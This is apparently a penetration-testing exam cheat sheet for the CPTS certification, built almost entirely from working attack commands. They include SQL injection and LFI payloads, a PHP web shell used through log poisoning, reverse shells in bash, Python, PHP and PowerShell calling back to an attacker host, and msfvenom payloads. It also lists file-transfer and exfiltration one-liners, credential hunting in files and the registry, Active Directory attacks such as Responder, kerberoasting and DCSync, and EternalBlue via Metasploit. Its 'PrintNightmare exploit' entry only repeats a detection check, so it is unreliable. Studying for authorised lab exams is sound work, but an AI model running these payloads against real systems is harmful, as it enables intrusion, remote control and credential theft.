# CPTS Exam Quick Reference Checklist

## 🎯 Pre-Exam Setup

### Environment Preparation
```bash
# Set up workspace
export IP=10.10.10.10
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
mkdir -p {nmap,scans,exploits,loot,notes,screenshots}

# Start tmux
tmux new -s cpts

# Verify VPN
ping -c 3 $IP
```

---

## 📋 Phase 1: Initial Enumeration (30-60 min)

### Quick Port Scan
```bash
# Fast all ports
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA nmap/allports

# Extract ports
ports=$(grep open nmap/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')

# Detailed scan
sudo nmap -sC -sV -p $ports $IP -oA nmap/detailed

# UDP top 100
sudo nmap -sU -F --top-ports 100 $IP -oA nmap/udp
```

### Service-Specific Quick Checks

#### FTP (21)
```bash
# Anonymous login
ftp $IP
# Username: anonymous
# Password: anonymous

# Download all
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

#### SSH (22)
```bash
# Banner grab
nc -nv $IP 22

# Try default creds
ssh root@$IP
ssh admin@$IP
```

#### SMTP (25)
```bash
# User enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
```

#### DNS (53)
```bash
# Zone transfer
dig axfr @$IP domain.htb
host -l domain.htb $IP
```

#### HTTP/HTTPS (80/443)
```bash
# Tech detection
whatweb $IP
curl -I http://$IP

# Directory fuzzing
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# VHost fuzzing
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
```

#### SMB (139/445)
```bash
# Quick enum
smbclient -N -L //$IP
smbmap -H $IP
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --rid-brute

# Full enum
enum4linux-ng $IP -A
```

#### SNMP (161 UDP)
```bash
# Community string brute
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP

# Walk
snmpwalk -v2c -c public $IP
```

#### LDAP (389/636)
```bash
# Anonymous bind
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"
```

#### MySQL (3306)
```bash
# Try default creds
mysql -u root -p -h $IP
mysql -u root -h $IP
```

#### MSSQL (1433)
```bash
# Connect
impacket-mssqlclient sa:password@$IP -windows-auth

# Check xp_cmdshell
SQL> xp_cmdshell 'whoami'
```

#### RDP (3389)
```bash
# Check NLA
nmap -p 3389 --script rdp-ntlm-info $IP
```

#### WinRM (5985/5986)
```bash
# Test access
crackmapexec winrm $IP -u username -p password
evil-winrm -i $IP -u username -p password
```

---

## 🎯 Phase 2: Web Enumeration (If HTTP/HTTPS found)

### Standard Web Workflow
```bash
# 1. Technology detection
whatweb $IP
curl -I http://$IP

# 2. Robots.txt, sitemap
curl http://$IP/robots.txt
curl http://$IP/sitemap.xml

# 3. Directory enumeration
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,js

# 4. VHost discovery
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

# 5. Parameter fuzzing
ffuf -u http://$IP/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# 6. Check for common files
curl http://$IP/admin
curl http://$IP/backup
curl http://$IP/config.php
curl http://$IP/.git/
curl http://$IP/.env
```

### Common Web Vulnerabilities

#### SQL Injection
```bash
# Test manually
' OR 1=1-- -
admin' OR '1'='1
' UNION SELECT NULL-- -

# SQLMap
sqlmap -u "http://$IP/page.php?id=1" --batch --dump
```

#### LFI/RFI
```bash
# LFI
http://$IP/page.php?file=../../../../etc/passwd
http://$IP/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
# Inject PHP in User-Agent, then access log via LFI
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP
http://$IP/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```

#### Command Injection
```bash
# Test
; whoami
| whoami
& whoami
`whoami`
$(whoami)
```

#### File Upload
```bash
# PHP web shell
<?php system($_GET['cmd']); ?>

# Bypass filters
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
```

---

## 🚀 Phase 3: Exploitation & Initial Access

### Reverse Shell Payloads

#### Bash
```bash
bash -i >& /dev/tcp/$LHOST/443 0>&1
bash -c 'bash -i >& /dev/tcp/$LHOST/443 0>&1'
```

#### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### PHP
```php
<?php system("bash -c 'bash -i >& /dev/tcp/$LHOST/443 0>&1'"); ?>
```

#### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listener
```bash
# Netcat
nc -nvlp 443

# rlwrap (for Windows)
rlwrap nc -nvlp 443
```

### MSFVenom Payloads
```bash
# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=443 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f raw > shell.jsp
```

---

## 🔧 Phase 4: Shell Stabilization

### Linux
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

### Windows
```bash
# Use rlwrap on attacker side
rlwrap nc -nvlp 443
```

---

## 📊 Phase 5: Post-Exploitation

### Linux Enumeration
```bash
# System info
uname -a
cat /etc/os-release
hostname

# User info
id
sudo -l
cat /etc/passwd
cat /etc/group

# Network
ip a
ip route
netstat -tulpn
cat /etc/hosts

# Processes
ps aux
ps aux | grep root

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Capabilities
getcap -r / 2>/dev/null

# History
cat ~/.bash_history
cat ~/.mysql_history

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

### Windows Enumeration
```powershell
# System info
systeminfo
hostname
whoami /all

# Network
ipconfig /all
route print
netstat -ano

# Processes
tasklist /v
wmic process list full

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
wmic service list full

# Installed software
wmic product get name,version

# Saved credentials
cmdkey /list

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## 🔓 Phase 6: Privilege Escalation

### Linux PrivEsc Quick Checks
```bash
# Sudo
sudo -l

# SUID
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel version
uname -a
searchsploit linux kernel $(uname -r)

# Automated
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Windows PrivEsc Quick Checks
```powershell
# Privileges
whoami /priv

# Groups
whoami /groups

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Automated
.\winPEASx64.exe
```

---

## 🌐 Phase 7: Active Directory (If applicable)

### No Credentials
```bash
# LLMNR poisoning
sudo responder -I tun0 -dwv

# User enumeration
kerbrute userenum -d domain.local --dc $IP users.txt

# AS-REP Roasting
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

### With Credentials
```bash
# Bloodhound
bloodhound-python -u user -p password -ns $IP -d domain.local -c all

# SMB enumeration
crackmapexec smb $IP -u user -p password --shares
crackmapexec smb $IP -u user -p password --users

# Kerberoasting
impacket-GetUserSPNs domain.local/user:password -dc-ip $IP -request

# Password spraying
crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success

# DCSync (if DA)
impacket-secretsdump domain.local/user:password@$IP
```

---

## 📁 File Transfer Methods

### Linux Target

#### Download
```bash
# wget
wget http://$LHOST/file

# curl
curl http://$LHOST/file -o file

# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://$LHOST/file", "file")'

# Netcat
nc -nvlp 443 < file  # Attacker
nc $LHOST 443 > file  # Victim
```

#### Upload
```bash
# Python upload server (attacker)
python3 -m uploadserver 80

# curl (victim)
curl -X POST http://$LHOST/upload -F 'files=@file'
```

### Windows Target

#### Download
```powershell
# PowerShell
iwr -uri http://$LHOST/file.exe -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://$LHOST/file.exe','file.exe')

# certutil
certutil -urlcache -split -f http://$LHOST/file.exe file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://$LHOST/file.exe C:\Temp\file.exe
```

#### Upload
```powershell
# PowerShell
(New-Object Net.WebClient).UploadFile('http://$LHOST/upload', 'file.txt')
```

---

## 🔑 Password Cracking

### Hash Identification
```bash
# hashid
hashid hash.txt

# hash-identifier
hash-identifier
```

### John the Ripper
```bash
# Crack hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked
john --show hash.txt

# Specific format
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Hashcat
```bash
# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (TGS-REP)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AS-REP
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🎯 Common Exploits

### EternalBlue (MS17-010)
```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms17-010 $IP

# Exploit with Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set LHOST $LHOST
exploit
```

### PrintNightmare (CVE-2021-1675)
```bash
# Check vulnerability
rpcdump.py @$IP | grep MS-RPRN

# Exploit
impacket-rpcdump @$IP | grep MS-RPRN
```

---

## 📝 Documentation Tips

### Screenshot Everything
```bash
# Take screenshot (Linux)
scrot screenshot.png

# With timestamp
scrot "screenshot_$(date +%Y%m%d_%H%M%S).png"
```

### Note Template
```markdown
# Target: $IP

## Enumeration
- Open ports: 
- Services:
- OS:

## Vulnerabilities
- 

## Exploitation
- Method:
- Payload:

## Privilege Escalation
- Method:
- Proof:

## Flags
- User flag: 
- Root flag:
```

---

## ⏱️ Time Management

### Per Machine (3 machines, 10 days)
- **Day 1-2**: Full enumeration
- **Day 2-3**: Initial access
- **Day 3-4**: Privilege escalation
- **Day 4**: Lateral movement (if needed)
- **Buffer**: 1 day

### Daily Schedule
- 8-10 hours active testing
- Break every 90 minutes
- Document as you go
- Review notes end of day

---

## 🚨 Common Mistakes to Avoid

1. ❌ Skipping UDP scans
2. ❌ Not checking for virtual hosts
3. ❌ Forgetting to stabilize shells
4. ❌ Not checking `sudo -l` on Linux
5. ❌ Ignoring default credentials
6. ❌ Not taking screenshots
7. ❌ Tunnel vision on one attack vector
8. ❌ Not reading automated tool output
9. ❌ Skipping manual verification
10. ❌ Not taking breaks

---

## 🔗 Quick Links

- [Full Methodology](../00-Methodology/Penetration-Testing-Workflow.md)
- [Nmap Reference](../08-Tools-Reference/Nmap.md)
- [SMB Enumeration](../02-Enumeration/Service-Specific/SMB-Enumeration.md)
- [Shell Stabilization](../03-Initial-Access/Shell-Stabilization.md)
- [Linux PrivEsc](../05-Privilege-Escalation/Linux-PrivEsc.md)
- [Windows PrivEsc](../05-Privilege-Escalation/Windows-PrivEsc.md)

---

**Remember**: Methodology over speed. Be systematic, document everything, and don't skip steps!

**Good luck! 🎯**
